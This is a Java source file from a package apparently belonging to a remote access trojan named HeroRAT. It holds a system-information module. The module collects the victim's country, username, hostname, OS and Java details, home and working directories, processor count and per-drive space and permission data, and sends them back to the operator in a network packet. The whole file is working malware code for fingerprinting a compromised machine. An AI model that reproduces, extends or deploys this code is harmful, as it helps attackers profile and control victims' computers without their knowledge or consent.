package net.herorat.features.system;

import java.io.DataOutputStream;
import java.io.File;
import java.net.InetAddress;

import javax.swing.filechooser.FileSystemView;

import net.herorat.network.Packet;
import net.herorat.network.Packet7System;


public class System
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p = new Packet7System(outputstream, new String[] { getInformation() });
		p.write();
	}
	
	public static String getInformation()
	{
		try
		{
			StringBuffer buffer = new StringBuffer();
			
			buffer.append("Country: " + java.lang.System.getProperty("user.country"));
			buffer.append("\nUsername: " + java.lang.System.getProperty("user.name"));
			buffer.append("\nSystem: " + java.lang.System.getProperty("os.name") + " " + java.lang.System.getProperty("os.arch") + " " + java.lang.System.getProperty("os.version"));
			buffer.append("\nComputer: " + InetAddress.getLocalHost().getHostName());
			buffer.append("\nUser home: " +  java.lang.System.getProperty("user.home"));
			buffer.append("\nCurrent dir.: " +  java.lang.System.getProperty("user.dir"));
			
			buffer.append("\n\nJava version: " +  java.lang.System.getProperty("java.version"));
			buffer.append("\nJava home: " +  java.lang.System.getProperty("java.home"));
			buffer.append("\nJVM version: " +  java.lang.System.getProperty("java.vm.version "));			
			
			buffer.append("\n\nAvailable processors (cores): " + Runtime.getRuntime().availableProcessors());

			FileSystemView fsv = FileSystemView.getFileSystemView();			
			for (File root : File.listRoots())
			{
				buffer.append("\n\no " + (fsv.getSystemDisplayName(root).equals("") ? "Unknow name" : fsv.getSystemDisplayName(root)));
				
				buffer.append("\n\tIs drive: " + fsv.isDrive(root));
				buffer.append("\n\tIs floppy: " + fsv.isFloppyDrive(root));
				buffer.append("\n\tReadable: " + root.canRead());
				buffer.append("\n\tWritable: " + root.canWrite());
				buffer.append("\n\tFile system root: " + root.getAbsolutePath());
				buffer.append("\n\tTotal space (bytes): " + root.getTotalSpace());
				buffer.append("\n\tFree space (bytes): " + root.getFreeSpace());
				buffer.append("\n\tUsable space (bytes): " + root.getUsableSpace());
			}
			
			return buffer.toString();
		}
		catch (Exception e) {}
		
		return "";
	}
}